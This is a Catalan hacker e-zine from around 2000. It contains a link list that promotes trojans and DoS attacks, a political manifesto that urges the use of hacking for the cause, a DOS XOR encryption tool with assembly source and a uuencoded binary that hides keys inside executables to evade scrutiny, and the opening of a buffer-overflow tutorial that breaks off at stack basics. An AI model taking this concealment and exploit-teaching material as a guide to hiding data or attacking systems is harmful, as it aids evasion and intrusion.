
[ http://intruders.silesianet.pl/ ] - Pàgina del grup "Intruders", aqui podreu
       trobar codigs fonts en asm, i programes troyan i atacs DoS per màquines
       victima rulant amb wNT o 9x.

[ http://blacksun.box.sk/tutorials.html ] - Tutorials

[ http://packetstorm.securify.com/papers.html ] - Milers de articles actualit-
       zats sobre seguretat informàtica, encriptació, firewalls, llenguatges,
       protocols, unix, i informació sobre diversos sistemes operatius.

[ tmsecrets.cjb.net ] - És un portal català obert recentment, en el qual
       podreu trobar bastanta info de temàtica underground i hpcv.

[ http://www.lawebdelprogramador.com ] - Aqui podreu trobar tot el que
       necessiteu per poder programar, milers de manuals, ajudes, gent, etc.


==============================================================================
00 E9 45 32 25 41 23 22 55 A9 3C 2B 35 D5 F5 2A 00 35 B6 4D 72 1A 95 03 02 01
CC B2 FF 00 FF 00 34 30 E8 29 A3 A2 4D 3E E9 3C 91 23 6A 46 22 01 12 34 A4 3D
D3 34 2A 2B 34 C3 B3 34 85 18 A6 B7 BC ED 92 3B 7C E9 8C 3C 03 E7 41 61 27 3D
5A 2D 3E 5B 82 2C 3A 9D 7E 09 43 18 93 73 8D 3E 9E 27 93 12 28 9C 1A 93 6C F1
==============================================================================


$0D$


##############################
 #                          #
  # Missatge de ReDosDeDos #
 #                          #
##############################


En els temps que estem passant hi ha una certa tendència a considerar
"dolent" tot allò que trenca la norma, que es surt del sistema fixat,
un clar exemple n'és el Hacking, i  la seva combinació amb la lluita
pel comunisme i la llibertat de tots els pobles fa que encara sigui més
rebutjat pel sistema. Lluitar per la igualtat i la llibertat, contra el
racisme, el feixisme, pel nostre poble, contra el masclisme, contra el
capitalisme, per la llibertat d'expressió, pels drets fonamentals de
les persones, pel comunisme, per la independència dels països oprimits,
per l'abolició de les presons, per l'ecologisme, per la llibertat dels
i les immigrants, contra les monarquies, contra el sistema consumista,
l'explotació laboral, la destrucció d'ecosistemes, per la igualtat en
el treball, contra la impune repressió de les forces d'ocupació, pel
dret a un sostre i una educació, per la llibertat sexual, contra la
moda nazi, contra la propietat privada, per l'internacionalisme, pel
MARXISME-LENINISME, contra les i els apolitics (que col·laboren amb el
sistema amb la seva passivitat), per la llibertat dels i les preses
polítiques, contra les grans multinacionals i l'explotació del tercer
món, contra les ETT, els bancs, les casernes, els grans magatzems i
altres grans fonts de capitalisme, contra la privatització, contra la
manipulació informativa i en contra de moltes altres injustícies amb
les que podriem omplir vàries més pàgines; no és (al contrari del que
ens intenten fer creure) cap delicte. Busquem un món just i solidari,
busquem la llibertat, i ens diuen criminals. Ells/es maten contra la
dissidència, destrueixen boscos, empresonen innocents per idees,
trafiquen amb les nostres vides, ens escupen a la cara contínuament,
però NOSALTRES som criminals. Lluitem per la pau, intentem arribar a
una vida on regni la llibertat, i els/les criminals som nosaltres.
Maten, roben, estafen, reprimeixen, enganyen, trafiquen, empresonen,
atraquen, lliguen, ofeguen, arruïnen, atropellen, amenacen, corrompen,
anihilen, esclafen, damnifiquen, dominen, exploten, executen,
empobreixen, imposen, marginen, obliguen, oprimeixen, sentencien,
silencien, torturen,... i malgrat tot, som nosaltres els i les
criminals. És evident que el capital vol acabar amb aquesta lluita, 
però la lluita no és pot parar, per cada atac hi haurà una resposta
major, i per cada agressió una venjança.
Molta gent creu que utilitzar els mateixos mètodes que un feixista
és feixisme, però cauen en un greu error, ja que el mitjà no té res
a veure amb l'objectiu. És per això que cal utilitzar TOTS ELS
MITJANS de lluita necessàris per assolir aquests objectius, i la
informàtica n'és un.
Des de REDOSDEDOS animem a tothom que estigui d'acord amb les nostres
idees a unir-se a nosaltres per a poder lluitar amb unitat i força,
des d'usuaris/es a professionals, cap hacker ha nascut amb un manual
de linux sota el braç.
Com va dir Marx, cal aplicar el progrés a la revolta.

                 VISCA LA TERRA LLIURE I SOCIALISTA
                   REDOSDEDOS - redos@olemail.com

                                              per C0M4ND4NT N4T N484X



]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[
]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[


$0E$

&&&&&&&&&&&&&&&&  &&&&&&&&&&&&&&&&&
&               &  &              &
&  Shadow-CRiPT  &  & by Pop.tPH  &
&                 &  &            &
&&&&&&&&&&&&&&&&&&&&  &&&&&&&&&&&&&

Continguts:
        Readme.txt    :  Explicacio
        ShdwCrpt.Asm  :  Codi font de la versio 2.0
        ShdwCrpt.Uue  :  Codi compilat uuencodat

1.- Readme -- Llegiu.me
---[ Readme.txt ]-------------------------------------------------------------

Benvinguts a la segona versio del ShadowCript,  molts us preguntareu el que fa
aquest programa,  doncs be, us explico... el ShadowCript es un simple programa
d'encriptacio  XOR,  m'explico pels qui  no sapiguen  gaire d'ASM:  L'operacio
logica XOR actua amb els bits de la seguent forma:

     |  A xor B equ C  |
     `-----------------'                   .------------
        0     0     0         .-----------'  Esquema Xor
        0     1     1         |
        1     0     1         |
        1     1     0         |
     -------------------------'

Si us fixeu, si operem A xor B ens donara C, pero si operem C xor B tindrem A. 
Simple no? Doncs be, amb aquesta simple base, opera tot el programa. Explico:

Si introduim un texte A i un texte B podem conseguir una clau binaria C. I
per tant si donem el texte B i la clau C podrem conseguir el texte A. Exemple:

texte A:  Aixo es un texte compromes i per tant no l'entregarem
texte B:  Aquest sera el texte visible, podem ficar parides!!!!
clau  C:  &^%^@^%$#(#$)(@)*&!^$#*)(@*&)#@!_&#(*@)$@)#*$^@)@_)$&

<nota> la clau C no esta feta amb un xor, es un exemple </note>

Si us fixeu, es necessari que els dos textes tinguin la mateixa longitud, pero
tranquils que el programa ja ho calcula :P - 

aquesta versio (v2.00) consta d'un menu amb quatre opcions:
        1) Encriptar
        2) Desencriptar
        3) Ocultar clau
        4) Extreure clau oculta

1) Encriptar
   El programa ens demana el texte primari, en principi el que no volem que
   es vegi, o sigui el texte compromes, en principi la longitud maxima es de
   2000h caracters, uns 8200 caracters (suficients no?), encara que poden ser
   ampliats modificant els EQUs del principi, tenint en compte que els dos
   buffers no es superpossin ni sobrepassin el segment (ffffh).
   Despres ens demanara el segon texte (te les mateixes normes que el primer)
   excepte que el nombre de caracters ve marcat per la longitud la primera
   cadena de texte introduida (texte1), quan arribem a aquesta longitud, el
   programa ens grabara els dos textes en fitxers: "--txt1.txt" i "--txt2.txt"
   i a continuacio ens generara la clau amb una simple operacio XOR i ens
   grabara la clau en el fitxer "--key.txt".
   Per cert, els noms dels fitxers de sortida poden ser modificats modificant
   el cf (codi font) o el binari amb un hexedit.

2) Desencriptar:
   El programa ens demanara el nom del fitxer on esta el texte (max 12 chars)
   i despres el fitxer on tenim la clau (max 12 caracters), els obrira al
   buffer, els Xorara i treura el texte1 resultant en el nom del fitxer que
   li indiquem.
   Haurem de tenir cura de que el fitxer de texte medeixi el mateix que la
   clau pq sino el programa donara error i no us deixara desencriptar.

3) Ocultar clau:
   Aquesta opcio ens permetra ocultar claus dins de fitxers, qualsevol tipus
   de fitxer, tant pot ser EXE, BIN, COM ...el k volguem i que seguira
   funcionant normalment. El programa ens demana el nom del fitxer de la
   clau, l'obrira i el grabara al buffer, i li graba a continuacio el tamany
   de la clau (WORD=2bytes), llavors demanara el nom del fitxer on l'ha de
   grabar, i ho fara de la seguent forma:
    __________        __________
   |          |      |          |
   | file EXE |  --> | file EXE | -> ? bytes (recomenable < 64kb)
   |__________|      |__________|
                     |___key____| -> ? bytes
                     |_Key_Size_| -> 2 bytes

4) Extreure clau:
   Aquesta opcio serveix per extreure la clau d'un fitxer on previament
   haguem grabat la clau...pero aqui esta el fallo, i si previament no
   hem grabat cap clau??? i extreiem la clau? doncs ens creara un fitxer
   amb brosa, la rao per la qual no ens avisa es pq he fet que el fitxer
   no grabi peuera (com header pero per abaix :), i pq? doncs per evitar
   sospites, d'aquesta forma no es pot saber si el fitxer k ens han 
   enviat adjunt (per exemple) es una clau encoberta.
   Ens demanara el nom del fitxer on hi ha la clau i el nom del fitxer
   on volem extreure la clau.


ExempleD'uS:
@@@@@@@@@@@@
Un amic vostre us vol passar un texte compromes en el que inciti a la rebelio
contra les forces repressores de l'estat ;) sense que els d'enfopol li revisin
el texte, per tant decideix recorrer al gran ShadowCript per ocultar-lo, aixi
que escriu el texte A:
        Hola compatriotes, us envio aquest mail per informar-vos que la
        rebelio contra l'exercit espanyol comensa aquesta nit en la plasa 
        dels porcs i anirem pujant fins a montjuic.

pero decideix ocultar-ho entregant el texte B:
        Ei companys!, us adjunto aquest programa, es un editor de textes
        per ms-dos molt util i tal,  ja em direu si us agrada o que, us
        ho deixo a les vostres mans, siau!!!!!!!!!!

genera la clau i llavors agafa el programa edit.com i li oculta la clau,
llavors envia el mail:
         _________________________     _______________
        |_Sr. Mail______________|x|   | Attached file |
        |                       |-|   |---------------|
        | Hola companys!, us ad | |---|  * edit.com   |
        | junto aquest programa | |   |_______________|
        | , es un editor de tex | |
        | tes per ms-dos molt u | |
        | til i tal,  ja em ... | |
        |_______________________|_|

Llavors el(s) qui rebin el mail diran...ummm fitxer adjunt...li extreure la
clau, fare copiar/pegar del texte en un fitxer nou, i el desencriptare amb
el ShadowCript (F). i llavors pim pam obtenim el texte inicial, el que era
compromes.

-----

Actualitzacions:        http://cathack.itgo.com
Historial:
        v1.00   -  14/6/00
                -  Funcionen la 1a i 2a opcions
        v1.50   -  16/6/00
                -  Funcionen la 3a i 4a opcions
        v2.00   -  18/6/00
                -  Optimitzacio del codi
                        - Reduccio de tamany
                        - Optimitzacio d'ordres. (+rapid)

<nota> Segurament si reviseu el codi observareu fallos, q podien ser mes
  optimitzats, com lo de les subrutines i els buffers WORD de FileSize i
  chars, pero bueno sembla que és pot veure bastant clar el funcionament
  del programa i demés, aixi que no us enfadeu :P - Si voleu podeu
  millorar-lo vosaltres...jo ho faré quan tingui temps.

Aquest programa es de lliure distribucio, podeu modificar-lo, copiar-lo,
borrar-lo o fer-lo de nou lliurement sense pagar-me cap mena de taxa...
encara que no us dire que no, si voleu pagar-me per modificar-lo digueu-me
algo a: poptph@hotmail.com - que no nomes de drogues viuen els homes! ;)


>> Be Ware, The Big PanCake Comes <<

---[ Readme.txt ]-------------------------------------------------------------

2.- Codi font del programa (cf)
---[ ShdwCrpt.Asm ]-----------------------------------------------------------
; &&&&&&&&&&&&&&&&&&&&&  &&&&&&&&&&&&&&&&&
; &                    &  &              &
; &  Shadow-CRiPT v2.00 &  & by Pop.tPH  &
; &                      &  &            &
; &&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&&&&&&&

.model small
.stack
jumps           ; Permet salts llargs (a DESENCRIPTAR:)
.code

intro       equ     0Ah, 0Dh
texte_zone  equ     2000h
texte2_zone equ     4000h

        push cs
        pop ds          ; Descorrem el data segment

        mov ah, 9h
        lea dx, frase_intro
        int 21h

        loop_teclat:
                xor ax, ax
                int 16h         ; == inkey$
                        cmp al, '1'
                        je ENCRIPTAR
                        cmp al, '2'
                        je DESENCRIPTAR
                        cmp al, '3'
                        je AMAGAR
                        cmp al, '4'
                        je EXTREURE
                jmp loop_teclat

ENCRIPTAR:
        mov ah, 9
        lea dx, intro_texte
        int 21h

        xor si, si
get_texte:
        xor ax, ax
        int 16h
                cmp ah, 1Ch     ; usease return
                je _get_texte
                cmp al, 08h   ; usease borrar pacatra
                je _backspace
        mov dx, ax
        mov ah, 2
        int 21h
        mov byte ptr [ texte_zone + si ], dl     ; graba tecla
        inc si
        jmp get_texte

_backspace:
         cmp si,0
         je get_texte
         dec si

        mov ah, 2
        mov dl, 8
        int 21h
        mov ah,2
        mov dl, ' '
        int 21h
        mov ah,2
        mov dl, 8
        int 21h
        jmp get_texte

_get_texte:
        mov word ptr cs:[chars], si ; grabem si en "chars" (vds (virtual data segment))
        mov cx, word ptr cs:[chars]   ; Nomes deixara escriure X caracters
        mov byte ptr [ texte_zone + si ], 00h     ; final de txt
        mov ah, 09h
        lea dx, intro_code
        int 21h
        xor si, si
get_texte2:
        xor ax, ax
        int 16h
         cmp al, 08h   ; usease borrar pacatra
         je _backspace2

        mov dx, ax
        mov ah, 2
        int 21h

        mov byte ptr [ texte2_zone + si ], dl     ; graba tecla
        inc si
        loop get_texte2
        jmp _get_texte2

 _backspace2:
         cmp si,0
         je get_texte2
         dec si
         inc cx

        mov ah, 2
        mov dl, 8
        int 21h
        mov ah,2
        mov dl, ' '
        int 21h
        mov ah,2
        mov dl, 8
        int 21h
        jmp get_texte2

_get_texte2:
        mov ah,9
        lea dx, saving_texts
        int 21h

        lea dx, txt1_file
        mov bp, texte_zone
        call WriteOnFile  ; Escriure --txt1.txt

        lea dx, txt2_file
        mov bp, texte2_zone
        call WriteOnFile  ; Escriure --txt2.txt

        mov ah, 09h
        lea dx, generate_key
        int 21h

                ; //////////////////////////////
                ; ///  GENERATE KEY PROCESS  ///
                ; //////////////////////////////

        mov cx, word ptr cs:[chars]       ; nombre de caracters a enXORar
        xor si,si                         ; 'SI' == contador de bytes
_generate_key:
        mov ah, byte ptr[texte_zone + si]
        xor ah, byte ptr[texte2_zone + si]          ; algorisme XOR
        mov byte ptr[texte_zone + si], ah
        inc si
        loop _generate_key

        lea dx, key_file
        mov bp, texte_zone
        call WriteOnFile

        mov ah,9
        lea dx, frase_ok
        int 21h
        jmp The_End

DESENCRIPTAR:
        mov ah,9
        lea dx, frase_file
        int 21h

        lea bp, file
        call ReadFileName

        mov ax, 3D00h ; Obrim per llegir
        lea dx, file
        int 21h
                jc error_file   ; si no pot dona error
                xchg bx,ax

Read_TxtFile_OnMemory:
        mov ax,4202h
        sub cx,cx
        sub dx,dx
        int 21h
        mov word ptr cs:[FileSize], ax ; Grabem la longitud

        mov ax, 4200h ; ens situem al principi del fitxer
        int 21h

        mov ah, 3Fh
        mov cx, word ptr cs:[FileSize]
        mov dx, texte_zone
        int 21h          ; Llegim el fitxer al buffer

;Demana el fitxer on hi ha la clau:
        mov ah,9
        lea dx, frase_key
        int 21h

        lea bp,key
        call ReadFileName

        mov ax,3D00h ; Obrim per lectura
        lea dx, key
        int 21h
          jc Error_file
          xchg bx, ax

Read_KeyFile_OnMemory:
        mov ax, 4202h
        xor cx, cx
        xor dx, dx
        int 21h
        cmp word ptr cs:[FileSize], ax
        jne Error_Size  ; Tenen la mateixa longitud???

        mov ax, 4200h
        int 21h

        mov ah, 3Fh
        mov cx, word ptr cs:[FileSize]
        mov dx, texte2_zone
        int 21h         ; Llegim la clau al buffer

        mov cx, word ptr cs:[FileSize]
Generate_Original_Text:
        xor si,si
    @_: mov ah, byte ptr[texte2_zone + si]
        xor byte ptr[texte_zone + si], ah          ; XOR
        inc si
        loop @_

Save_OnNewFile:
        mov ah,9
        lea dx, frase_new
        int 21h

        lea bp, newfile
        call ReadFileName

WriteOnFile_:
        mov ah, 3Ch
        xor cx, cx
        lea dx, newfile
        int 21h         ; Creem el nou fitxer

        mov ax, 3D02h   ; obrim amb r/w
        lea dx, newfile
        int 21h
        xchg bx, ax

        mov ax, 4000h
        mov cx, word ptr cs:[FileSize]
        mov dx, texte_zone
        int 21h

        jc Error_file

        mov ah, 9
        lea dx, frase_ok
        int 21h

        jmp The_End

                ; ///////////////////////////////////////
                ; ////    HIDE KEY ON BINARY FILE    ////
AMAGAR:         ; ///////////////////////////////////////
        mov ah,9
        lea dx, _amagar
        int 21h

        lea bp, file
        call ReadFileName

        mov ax, 3D00h ; open to read
        lea dx, file
        int 21h
                jc error_file   ; si no pot dona error
                xchg bx,ax

      Read_File_OnMemory:
        mov ax,4202h
        sub cx,cx
        sub dx,dx
        int 21h
        mov word ptr cs:[FileSize], ax ; Grabem la longitud

        mov ax, 4200h ; ens situem al principi del fitxer
        int 21h

        mov ah, 3Fh
        mov cx, word ptr cs:[FileSize]
        mov dx, texte_zone
        int 21h          ; Llegim el fitxer al buffer

        ;Agregar el tamany de la clau a la key.

        mov bp, word ptr cs:[FileSize]
        mov word ptr cs:[texte_zone+bp], bp
        add word ptr cs:[FileSize],2

        ;-------
        mov ah,9
        lea dx, amagar_file
        int 21h

        lea bp, newfile
        call ReadFileName

        mov ax, 3D02h ; open to write
        lea dx, newfile
        int 21h
                jc error_file   ; si no pot dona error
                xchg bx,ax

      Write_Key_OnFile:
        mov ax,4202h
        sub cx,cx
        sub dx,dx ; ens situem al final
        int 21h

        mov ax, 4000h
        mov cx, word ptr cs:[FileSize]
        mov dx, texte_zone
        int 21h ; escribim la clau.

        mov ah, 3Eh
        int 21h         ; Tanca

        mov ah,9
        lea dx, frase_ok
        int 21h

        jmp The_End

                ; ///////////////////////////////////////
                ; ////  EXTRACT KEY FROM BINARY FILE  ///
EXTREURE:       ; ///////////////////////////////////////
        mov ah,9
        lea dx, frase_ext
        int 21h

        lea bp, file
        call ReadFileName

        mov ax,3D02h
        lea dx, file
        int 21h
         jc error_file
         xchg bx,ax

        mov ax,4202h
        xor cx,cx
        xor dx,dx
        int 21h    ; Situem al final= ho graba en DX:AX


        mov cx,dx
        mov dx,ax ; Aqui es: CX:DX
        sub dx, 2 ; Ens situem 2 bytes menys del final del fitxer
        mov ax,4200h
        push cx
        push dx   ; Grabem CX i DX
        int 21h

        mov ah, 3Fh
        mov cx, 2
        lea dx, FileSize
        int 21h   ; Llegim el tamany de la clau

        mov ax,4200h
        pop dx
        sub dx, word ptr cs:[FileSize]
        pop cx
        int 21h

        mov ah, 3Fh
        mov cx, word ptr cs:[FileSize]
        mov dx, texte_zone
        int 21h

        mov ah,9
        lea dx, frase_extnew
        int 21h

        lea bp,newfile
        call ReadFileName

        mov bp, word ptr cs:[FileSize]
        mov word ptr cs:[chars], bp
        lea dx, newfile
        mov bp, texte_zone
        call WriteOnFile  ; Escriure la clau en el nou fitxer

        mov ah,9
        lea dx,frase_ok
        int 21h

        jmp The_End

Error_Size:
        mov ah,9
        lea dx, size_error
        int 21h
        jmp The_End

Error_file:
        mov ah,9
        lea dx,file_error
        int 21h

The_End:
        mov ah,4ch
        int 21h

;// Call accessed subroutines
;////////////////////////////

ReadFileName:
        mov cx, 12
        xor si,si
    @a: xor ax, ax
        int 16h
         cmp ah, 1Ch
          je @end
         cmp al, 8
          je @backspace
        mov dx, ax
        mov ah,2
        int 21h ; print char
        mov byte ptr cs:[bp + si], dl
        inc si
        loop @a
        jmp @end
     @backspace:
        inc cx
        cmp si,0
         je @a
        dec si
        mov ah, 2
        mov dl, 8
        int 21h
        mov ah,2
        mov dl, ' '
        int 21h
        mov ah,2
        mov dl, 8
        int 21h
        jmp @a
      @end:
        ret

WriteOnFile:    mov ah, 3Ch
                xor cx,cx
                int 21h         ; Crear fitxer DX

                mov ax, 3D01h   ; Obrim el fitxer per escriure
                int 21h         ;
                xchg ax, bx     ; grabem el handle

                mov ah, 40h
                mov cx, word ptr cs:[chars]   ; numero de chars a escriure
                xchg dx, bp     ; Escribim la cadena de BP
                int 21h

                mov ah, 3Eh
                int 21h         ; Tanquem
                ret

; /////////[  Virtual Data Segment (VDS)  ]///////////////////////////////////

; Strings data:
frase_intro  db intro,'[ShadowCript] (SHDWCRPT) v2.00 by Pop.tPH', intro, intro
             db '  1) Encriptar un texte i generar la clau',intro
             db '  2) Desencriptar un texte amb la clau (desde fitxers)',intro
             db '  3) Amagar clau en fitxer binari (.exe, .com, .*)',intro
             db '  4) Extreure clau de fitxer binari',intro, intro,'$'
intro_texte  db 'Introdueix el texte (return per acabar):', intro ,' -$'
intro_code   db intro,intro,'Introdueix el texte visible:',intro,' -$'
saving_texts db intro,intro,'Grabant els textes en: --txt1.txt i --txt2.txt...$'
generate_key db intro,'Generant la clau a --key.txt...$'
frase_file   db intro,'Introdueix el nom del fitxer de texte: $'
frase_key    db intro,intro,'Introdueix el nom del fitxer on es troba la clau: $'
frase_new    db intro,intro,'Introdueix el nom del fitxer on grabo el resultat: $'
_amagar      db intro,'Fitxer de la clau: $'
amagar_file  db intro,intro,'Amagar-la en: $'
frase_ext    db intro,'Extreure clau del fitxer: $'
frase_extnew db intro,intro,'Extreure la clau al fitxer: $'
file_error   db intro,intro,'-ERROR- Aquest fitxer no existeix.$'
Size_error   db intro,intro,'-ERROR- Aquesta clau no correspon amb el texte.$'
frase_ok     db intro,intro,'-OK- El treball s`ha realitzat satisfactoriament.$'

; filenames:
key_file     db '--key.txt',0
txt1_file    db '--txt1.txt',0
txt2_file    db '--txt2.txt',0
file         db 00h,00h,00h,00h,00h,00h,00h,00h,00h, 00h,00h,00h, 0 ; 8+3+,0
key          db 00h,00h,00h,00h,00h,00h,00h,00h,00h, 00h,00h,00h, 0
newfile      db 00h,00h,00h,00h,00h,00h,00h,00h,00h, 00h,00h,00h, 0

; variables:
chars        dw ?
FileSize     dw ?

end
---[ ShdwCrpt.Asm ]------------------------------------------------------------

3.- shadowcript.uue (uuencoded file)
---[ ShdwCrpt.Uue ]------------------------------------------------------------
begin 666 Shcr2.zip
M4$L#!!0````(`,2BTBB">>WVU0,``+0(```)````4TA#4C(N15A%[551:!Q%
M&)Z]:Y8TF"`1*I2"<Y"'G/&&Y"XHADN]2Y-KB]K&BR"VBL[=3=/5O=UT=[:]
M^B1-T=2C>%"?\N"+A?JB#[(<URT%(5A(X:!4!,$@-4^7WI,/YD6Q_C.[>Y>D
M!_59'+B9V9GO^_[OG_^'>_V4B_H00AAET:-'.D+[D!R'X:>@/\<_L-#_XS\\
MAIYS]WNST68L]7WS0'J"'ZS5:NFD$]UZB-(I6+Y6TI.PQ"/M7P&8W`?`;0']
M^*]#?$)@^_G3L%3ON9%F;.4+A'/M!\M_(_[+"3?R77\S!C.6,^S;=\B5%UV5
M5(=<]<YE:#E0?*^C"$K/[%3*Y#9;[4,U(?;@1+:'VEV@7P:Z=T&]C7#KG8AW
M"3:9UD($+CRXD(%2VY]=1SAY'6568,UM_NZ5)3PA4"^IS=C6A@*[#<#?OJJV
M?E0::-J["N=V=.N6<JT1F1E;'[L/8E_5U0::@>BO@&Y=]9!PLM]3^X"XJK96
M)7'5)UZ2Q-1Z2A!?5NLJCVZ5E-WTC#18]PUFQJ6Y/T!P6@C>4%O'%3>=6O=N
M@&(C,BW7:PV4Z0:'.`>5,(EGQ<[I\Y,8VIG$-GI"$J1*ZBJY\BW"9!FLBG>I
M!AY^0&%H$/IFA]`N(^YA^1+2Q^>BJ%\&/CZ1=.'#.@>E[;Y)]6[UWO+#"%AY
M(R_,W(P@KRX213.GR-B!NOKV8^]\*["41(%?XJK@3)2R@(+H[>$:[*)BUR]V
M&\!Q7VO&;CZ%NET[Z7?M<*?7R,IP;O,W:+6LZ+6?>S7NVIJH!?A3IJ$*;D9V
MUJ<_^:FO#0R>7CA+2^:%(Y:VQ-_%HPO'9M\ZDI]_,X[/)\GX."Y<Q//F$N'S
MQP8&!P8QGHCC.:,HP-3"CH$YJW"&-;S(#&;!D4YQ4:>.@";C>);9['$T+1="
M'!XM,;O$\!F-5YAEQP4O%<?9,ET$AD0P([C%!<V@EH9'":NP%S`IFF68GY><
M2;!5X19S+.:S.IH!2[@?.6YPRRPY3*M@I@=F1BW&'<O`2P"E15J@5GP*%!,C
M@M&+<%ZSM8+.NJ"C%K`,#@C;A]C@>0HG$KS")PA,\#SR(RD^""'`.BJ?"TCA
M.U"`?,@N=A&[0QMF&5+2PYP@.QEI"O>PN0=K&A@<`:!`PVC_DK8(B9GBRF*V
MHW/*)2_7L;!;S:]9`@Y%]G"TMR"A=(#O7'>>8`\@,9?/G\PG</:<PVP>^C+`
M446S.;@F/6"!%J"*I@6^ER`/T6]A^0+.R5<3>`Z.+%:@NH[M]\]2R)+J&O^(
M<FQ3KMEG:)&;ED;+S.!DI%,=U*TKZE;UR?]6_O@'4$L!`A0`%`````@`Q*+2
M*()Y[?;5`P``M`@```D````````````@`/^!`````%-(0U(R+D5815!+!08`
1`````0`!`#<```#\`P``````
`
end
---[ ShdwCrpt.Uue ]------------------------------------------------------------

                                                La revolució es porta en el cor
                                                             per morir per ella
                                                                i no en la boca
                                                              per viure d'ella.

                                                                   -Che Guevara

###############################################################################
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
###############################################################################



$0F$

/**************************************
 * Buffer Overflows - Part 1          * 
 *****************************by KL4RK*/


NOTA1: Als que ja conegueu el codi assembler que utilitza el TASM, 
que és el més extès, un adonareu que en l'article no és així; uso
el ASM generat pel gcc, lleugerament diferent.

NOTA2: Seria recomanable un coneixement previ d'assembler. Indispensable
l'accés a un sistema linux (*nix?) amb un compte qualsevol (no fa falta r00t).
I també paciència i bona voluntat.


Una mica d'assembler & la pila
------------------------------

a) assembler

Recordem com funciona l'assembler. Treballar en assembler és treballar direc-
tament amb les instruccions del processador, de manera que no hi ha cap
manera més directa de treballar amb el processador.

Recordem de què disposem en les nostres màquines i386+ (intel 386 o superior):

--registres:
	Disposem d'uns quants registres que tenen diverses funcions. Els re-
	gistres emmagatzemen dades. Concretament, poden emmagatzem ar 32 bits,
	és a dir 4 bytes, la qual cosa ens permet emmagatzemar 4228250625
	nombres.

	Cada registre té un nom. Aquests són els q mes ens interessen:


	EAX, EBX, ECX, EDX  --> emmagatzematge de dades dels programes
	EIP	  --> adreça (@) de la següent instruccio a executar
	ESP	  --> marca l'@ del top de la pila (despres s'explica)
	EBP	  --> sobretot usat per marcar posicions dins la pila

	exemples:
	movl %eax,%ebx		;copia el contingut de eax a ebx
	addl %edx,%ebp		;equival a l'assignació ebp=ebp+edx
	subl %edx,%ebp		;equival a ebp=ebp-edx


--memòria:
	La memòria (RAM, no disc dur) és també un recurs que tenim a l'abast.
	Està organitzada en segments, que son petites parts de la memòria
	assignades al nostre programa. En principi, un programa té assig-
	nats tres segments: un pel codi (CS), un per les dades (DS) i un per
	la pila (SS, stack segment).

	Per accedir-hi, hem de dir, simplement, a quina adreça volem accedir.
	Posem uns quants exemples:

	movl (12), %eax	      ;copia els 4 bytes emmagatzemats a partir de
			      ;l'adreça 12 fins a la 15 de la memòria a eax.
	movl (%eax), %ebx	;copia els 4 bytes a partir de l'adreça que
				;   conté el registre eax a ebx.
	movl 12(%eax), %ebx	;ebx= els 4 bytes continguts a partir de
				;	l'adreça (eax+12) fins a (eax+15)
	movl 12,(%eax)		;copia el valor 12 a la posició de memòria
				;	apuntada per eax.
	movl 666,31(%eax)	;copia el valor 666 a la posició (eax+31).	
				;
	addl 17(%edx),eax	;eax = eax + valor contingut en (17+edx)

b) la pila

Què és? doncs era com una part de la 
memòria que serveix com un lloc on anar-hi posant dades. Però d'una manera
especial: l'ultima dada que hem apilat és la primera a la qual podem
accedir. És com una pila de plats. Podem afegir un altre plat a la pila, o 
treure el de dalt de tot.

El registre ESP guarda l'adreça de memòria que conté l'ultima dada que hem
apilat.

La Pila:
		a dalt de tot de la pila (a baix de tot de la mem.)
		  [top]
|		|
|---------------| <- %esp conté l'@ de dada5   
|     dada5	|
|---------------|
|     dada4	|
|---------------|
|     dada3	|	
|---------------|
|     dada2	|
|---------------|
|     dada1     |
+---------------+ [bottom]
		 a baix de tot de la pila (a dalt de tot de la mem.)

NOTA: Cada calaix del dibuix representa un espai de 4 bytes de la memòria.

La instrucció PUSH significa "apilar". Això és el que fa la màquina:
Per exemple: "pushl %eax" faria:
	%esp = %esp - 4
	*(%esp) = %eax
És a dir, decrementaria ESP en 4 bytes i guardria el valor de eax en
l'adreça marcada per esp (el top de la pila).

Si ara féssim "movl 41414141h, %eax" i després "pushl %eax", la pila
quedaria així:

|		|
|---------------| <- %esp conté l'@ de la ultima dada apilada
|   41414141 h  |
|---------------|
|     dada5	|
|---------------|
|     dada4	|
|---------------|
|     dada3	|	
|---------------|
|     dada2	|
|---------------|
|     dada1     |
+---------------+

La instrucció POP fa just el contrari. Per exemple: POP EAX faria:
	%eax = *(%esp)
	%esp = %esp + 4
És a dir: posa a eax la dada apuntada per esp, i incrementa esp en 4.
O sigui que desapila una dada de 4 bytes, la posa a eax, i actualitza
ESP, que és el punter cap al següent element de la pila.
	

Posem un altre exemple: si inicialment EAX=00112233h i EBX=41414141h i exe-
cutem el següent codi (assembler):

PUSH EAX		;apila EAX
PUSH EBX		;apila EBX

La pila quedaria així:

|		|
|---------------|<----- esp apunta aquí
|  0x41414141h	|
|---------------|
|  0x00112233h	| 
+---------------+

Si ara fessim POP ECX, ecx quedaria amb el valor 0x41414141h.
I la pila quedaria així:

|               |
|---------------|<----- esp apunta aquí
|  0x00112233h  |    
+---------------+


Suposo que amb això ja haurem entès tots què és la pila i com
funciona.


c) crides a funcions

Una altra cosa important per saber és com funcionen les crides a
funcions. Els paràmetres es passen per la pila, posem un exemple:

si tenim el programa p.c:

____________________________________________
void funcio(int a, int b) { return; }

int main(void)
{
	int a=1;
	int b=2;
        funcio(a,b);
	exit(0);
}
_____________________________________________

Compilem el programa amb l'opció -S, per veure com ha quedat en assembler:
$gcc p.c -S -o p.asm
I mirem ara com ha quedat la rutina principal (main:):

main:
	(...)
        movl -8(%ebp),%eax	;%eax = b
        pushl %eax		;apila EAX, és a dir apila b
